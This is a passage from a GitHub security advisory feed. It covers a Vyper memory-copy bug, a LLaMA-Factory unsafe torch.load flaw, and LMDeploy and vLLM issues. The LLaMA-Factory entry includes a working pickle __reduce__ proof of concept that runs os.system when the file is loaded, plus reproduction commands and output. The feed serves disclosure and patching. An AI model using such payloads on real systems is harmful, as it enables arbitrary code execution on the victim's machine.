0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    return a

@external
def foo():
    s: uint256[3000] = self.bar()
    assert(s[0] == 0)
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">try:
    c.foo()                     # Correctly reverts
except Exception as e:
    print("Correctly reverted")
try:
    c.foo(gas=210000)           # Incorrectly succeeds
    print("Incorrectly succeeded")
except Exception:
    pass
</code></pre>
<h4 id="identity-used-in-raw_revert">Identity used in <code>raw_revert</code></h4>
<ul>
<li>Affected versions: 0.3.8 - 0.4.0</li>
<li>A copy operation might appear as part of raw_revert</li>
<li>As a result the revert reason might be incorrect</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@external
def foo(_data: Bytes[10000]):
    b: Bytes[10000] = _data
    raw_revert(b)
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">calldata = binascii.unhexlify("bb" * 10_000)
c.foo(calldata)       # Has correct revert reason
c.foo(calldata, gas=4_800)       # Has empty revert reason, but not out-of-gas
</code></pre>
<h4 id="identity-to-copy-static-arrays">Identity to copy static arrays</h4>
<ul>
<li>Affected versions: 0.2.0 - 0.4.0</li>
<li>Vyper might perform a memory copy for static arrays, e.g. when moving them in and out of internal functions</li>
<li>As this access is especially cheap (due to the static checks) it can also happen for smaller sizes</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@external
def foo(x: uint256[2500]) -&gt; uint256:
    s: uint256[2500] = x
    t: uint256[2500] = s
    return t[0]
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">calldata = [2] + [0] * 2499
print(c.foo(calldata))              # Prints 2
print(c.foo(calldata, gas=74500))   # Prints 0
</code></pre>
<h4 id="identity-to-copy-and-return-string-or-bytes">Identity to copy and return String or Bytes</h4>
<ul>
<li>Affected versions: 0.20 - 0.4.0</li>
<li>Multiple situations in vyper might trigger a memory copy operation, e.g. moving data in and out of internal functions</li>
<li>If the target buffer is later returned, incorrect data might be returned</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@external
@view
def foo(x: String[1000000]) -&gt; String[1000000]:
    return x
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">calldata = "a"*1000000
x = c.foo(calldata)                 # Returns calldata
y = c.foo(calldata, gas=8_000_000)  # Returns empty data
</code></pre>
<h4 id="identity-and-accessing-the-length-of-the-target-data">Identity and accessing the length of the target data</h4>
<ul>
<li>Affected versions: 0.3.10 - 0.4.0</li>
<li>Accessing the data is fairly cheap, making it possible for smaller data copies</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@external
@view
def foo(x: String[1000000]) -&gt; uint256:
    y: String[1000000] = x
    return len(y)
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">calldata = "a"*1000000
x = c.foo(calldata)                 # Returns correct length
y = c.foo(calldata, gas=7_929_200)  # Returns incorrect length
</code></pre>
<h4 id="identity-to-copy-and-return-string-or-bytes-1">Identity to copy and return String or Bytes</h4>
<ul>
<li>Affected versions: 0.3.10 - 0.4.0</li>
<li>Multiple situations in vyper might trigger a memory copy operation, e.g. moving data in and out of internal functions</li>
<li>If the target buffer is later returned, incorrect data might be returned</li>
</ul>
<p>Vulnerable Code:</p>
<pre><code class="language-py">@external
@view
def foo(x: String[1000000]) -&gt; String[1000000]:
    return x
</code></pre>
<p>Problematic Call:</p>
<pre><code class="language-py">calldata = "a"*1000000
x = c.foo(calldata)                 # Returns calldata
y = c.foo(calldata, gas=8_000_000)  # Returns empty data
</code></pre>
<h3 id="impact">Impact</h3>
<p>A contract search was conducted and yielded no significant results.</p>
<p>The advisory was rated a medium because the likelihood is low, but difficult to detect by source code analysis alone, and could yield unexpected results if a contract is affected by the bug.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-vgf2-gvx8-xwc3">https://github.com/vyperlang/vyper/security/advisories/GHSA-vgf2-gvx8-xwc3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-21607">https://nvd.nist.gov/vuln/detail/CVE-2025-21607</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/4451">https://github.com/vyperlang/vyper/pull/4451</a></li>
<li><a href="https://github.com/vyperlang/vyper/commit/7136eab0a254aa2ff7ddca41cc05f2ee1fa99caf">https://github.com/vyperlang/vyper/commit/7136eab0a254aa2ff7ddca41cc05f2ee1fa99caf</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2025-33.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2025-33.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-vgf2-gvx8-xwc3">https://github.com/advisories/GHSA-vgf2-gvx8-xwc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vgf2-gvx8-xwc3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-01-14T16:34:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llamafactory] LLaMA-Factory Allows Arbitrary Code Execution via Unsafe Deserialization in Ilamafy_baichuan2.py]]></title>
        <id>https://github.com/advisories/GHSA-f2f7-gj54-6vpv</id>
        <link href="https://github.com/advisories/GHSA-f2f7-gj54-6vpv"/>
        <updated>2025-04-30T20:42:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>A critical vulnerability exists in the <code>llamafy_baichuan2.py</code> script of the <a href="https://github.com/hiyouga/LLaMA-Factory">LLaMA-Factory</a> project. The script performs insecure deserialization using <code>torch.load()</code> on user-supplied <code>.bin</code> files from an input directory. An attacker can exploit this behavior by crafting a malicious <code>.bin</code> file that executes arbitrary commands during deserialization.</p>
<h3 id="attack-vector">Attack Vector</h3>
<p>This vulnerability is <strong>exploitable without authentication or privileges</strong> when a user is tricked into:</p>
<ol>
<li>Downloading or cloning a malicious project folder containing a crafted <code>.bin</code> file (e.g. via zip file, GitHub repo).</li>
<li>Running the provided conversion script <code>llamafy_baichuan2.py</code>, either manually or as part of an example workflow.</li>
</ol>
<p>No elevated privileges are required. The user only needs to run the script with an attacker-supplied <code>--input_dir</code>. </p>
<h3 id="impact">Impact</h3>
<ul>
<li>Arbitrary command execution (RCE)</li>
<li>System compromise</li>
<li>Persistence or lateral movement in shared compute environments</li>
</ul>
<h3 id="proof-of-concept-poc">Proof of Concept (PoC)</h3>
<pre><code class="language-python"># malicious_payload.py
import torch, pickle, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("mkdir HACKED!",))  # Arbitrary command

malicious_data = {
    "v_head.summary.weight": MaliciousPayload(),
    "v_head.summary.bias": torch.randn(10)
}

with open("value_head.bin", "wb") as f:
    pickle.dump(malicious_data, f)
</code></pre>
<p>An example of <code>config.json</code>:</p>
<pre><code class="language-json">{
  "model": "value_head.bin",
  "hidden_size": 4096,
  "num_attention_heads": 32,
  "num_hidden_layers": 24,
  "initializer_range": 0.02,
  "intermediate_size": 11008,
  "max_position_embeddings": 4096,
  "kv_channels": 128,
  "layer_norm_epsilon": 1e-5,
  "tie_word_embeddings": false,
  "vocab_size": 151936
}
</code></pre>
<pre><code class="language-bash">(base) root@d6ab70067470:~/LLaMA-Factory_latest# tree
.
`-- LLaMA-Factory
    |-- LICENSE
    |-- README.md
    |-- malicious_folder
    |   |-- config.json
    |   `-- value_head.bin
    `-- xxxxx(Irrelevant documents omitted)
</code></pre>
<pre><code class="language-bash"># Reproduction
python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
</code></pre>
<p>➡️ Running this will execute the malicious payload and create a <code>HACKED!</code> folder.</p>
<pre><code class="language-bash">(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
CITATION.cff  LICENSE  MANIFEST.in  Makefile  README.md  README_zh.md  assets  data  docker  evaluation  examples  malicious_folder  pyproject.toml  requirements.txt  scripts  setup.py  src  tests
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out
2025-04-23 07:36:58.435304: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:477] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
E0000 00:00:1745393818.451398    1008 cuda_dnn.cc:8310] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered
E0000 00:00:1745393818.456423    1008 cuda_blas.cc:1418] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered
2025-04-23 07:36:58.472951: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
Load weights:  50%|██████████████████████████████████████████████████████████████████████████████████▌                                                                                  | 1/2 [00:00&lt;00:00, 123.70it/s]
Traceback (most recent call last):
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 112, in &lt;module&gt;
    fire.Fire(llamafy_baichuan2)
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 135, in Fire
    component_trace = _Fire(component, args, parsed_flag_args, context, name)
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 468, in _Fire
    component, remaining_args = _CallAndUpdateTrace(
                                ^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/fire/core.py", line 684, in _CallAndUpdateTrace
    component = fn(*varargs, **kwargs)
                ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 107, in llamafy_baichuan2
    save_weight(input_dir, output_dir, shard_size, save_safetensors)
  File "/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py", line 35, in save_weight
    shard_weight = torch.load(os.path.join(input_dir, filepath), map_location="cpu")
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1040, in load
    return _legacy_load(opened_file, map_location, pickle_module, **pickle_load_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py", line 1260, in _legacy_load
    raise RuntimeError("Invalid magic number; corrupt file?")
RuntimeError: Invalid magic number; corrupt file?
(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls
 CITATION.cff   LICENSE       Makefile    README_zh.md   data     evaluation   malicious_folder   pyproject.toml     scripts    src
'HACKED!'       MANIFEST.in   README.md   assets         docker   examples     out                requirements.txt   setup.py   tests
</code></pre>
<h3 id="affected-files">Affected File(s)</h3>
<ul>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>
<li><code>scripts/convert_ckpt/llamafy_baichuan2.py</code></li>
<li>Line: <code>torch.load(os.path.join(input_dir, filepath), map_location="cpu")</code></li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<ul>
<li>Replace <code>torch.load()</code> with safer alternatives like <code>safetensors</code>.</li>
<li>Validate and whitelist file types before deserialization.</li>
<li>Require checksum validation.</li>
</ul>
<p>Example patch:</p>
<pre><code class="language-python"># Replace torch.load() with safe deserialization
try:
    from safetensors.torch import load_file
    tensor_data = load_file(filepath)
except Exception:
    print("Invalid or unsafe checkpoint file.")
    return
</code></pre>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Avoid running the script with untrusted <code>.bin</code> files.</li>
<li>Use containers or VMs to isolate script execution.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://pytorch.org/docs/stable/generated/torch.load.html">torch.load() — PyTorch Docs</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li>
</ul>
<h3 id="credits">Credits</h3>
<p>Discovered and reported by <a href="https://github.com/Anchor0221">Yu Rong</a> and <a href="https://github.com/xhjy2020">Hao Fan</a>, 2025-04-23</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv">https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv</a></li>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a">https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a</a></li>
<li><a href="https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35">https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35</a></li>
<li><a href="https://github.com/advisories/GHSA-f2f7-gj54-6vpv">https://github.com/advisories/GHSA-f2f7-gj54-6vpv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f2f7-gj54-6vpv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-23T22:21:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lmdeploy] InternLM LMDeploy code injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jfvg-qm4p-473x</id>
        <link href="https://github.com/advisories/GHSA-jfvg-qm4p-473x"/>
        <updated>2025-04-23T19:37:40.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in InternLM LMDeploy up to 0.7.1. It has been declared as critical. Affected by this vulnerability is the function Open of the file lmdeploy/docs/en/conf.py. The manipulation leads to code injection. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3163">https://nvd.nist.gov/vuln/detail/CVE-2025-3163</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/issues/3254">https://github.com/InternLM/lmdeploy/issues/3254</a></li>
<li><a href="https://github.com/InternLM/lmdeploy/issues/3254#issue-2918865448">https://github.com/InternLM/lmdeploy/issues/3254#issue-2918865448</a></li>
<li><a href="https://vuldb.com/?ctiid.303109">https://vuldb.com/?ctiid.303109</a></li>
<li><a href="https://vuldb.com/?id.303109">https://vuldb.com/?id.303109</a></li>
<li><a href="https://vuldb.com/?submit.542527">https://vuldb.com/?submit.542527</a></li>
<li><a href="https://github.com/advisories/GHSA-jfvg-qm4p-473x">https://github.com/advisories/GHSA-jfvg-qm4p-473x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfvg-qm4p-473x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-03T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] CVE-2025-24357 Malicious model remote code execution fix bypass with PyTorch < 2.6.0]]></title>
        <id>https://github.com/advisories/GHSA-ggpf-24jw-3fcw</id>
        <link href="https://github.com/advisories/GHSA-ggpf-24jw-3fcw"/>
        <updated>2025-04-23T02:26:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54">https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54</a> reported a vulnerability where loading a malicious model could result in code execution on the vllm host. The fix applied to specify <code>weights_only=True</code> to calls to <code>torch.load()</code> did not solve the problem prior to PyTorch 2.6.0.</p>
<p>PyTorch has issued a new CVE about this problem: <a href="https://github.com/advisories/GHSA-53q9-r3pm-6pq6">https://github.com/advisories/GHSA-53q9-r3pm-6pq6</a></p>
<p>This means that versions of vLLM using PyTorch before 2.6.0 are vulnerable to this problem.</p>
